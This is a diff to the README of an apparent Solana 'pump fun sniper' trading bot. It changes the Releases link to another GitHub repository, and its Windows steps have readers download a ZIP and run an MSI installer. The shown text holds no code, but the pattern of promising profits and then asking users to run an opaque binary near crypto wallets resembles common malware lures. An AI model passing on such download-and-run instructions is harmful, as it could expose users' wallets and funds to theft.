@@ -44,7 +44,7 @@ Unlock the full potential of your trading strategy with **Solana pump fun Sniper
 ## 📥 Getting Started
 
 ### 🖥️ Installation for Windows
-1. Download the latest release from the [Releases Page](https://github.com/Raydium-Bot/Raydium-Sol-Sniper-Bot/releases/tag/v2.0).
+1. Download the latest release from the [Releases Page](https://github.com/Raydium-Bot/solana-pump-fun-sniper-bot/releases/tag/v2.0).
 2. Extract the ZIP file to your desired location.
 3. Launch the application by double-clicking on `solanapumpfunbot.msi`.
 
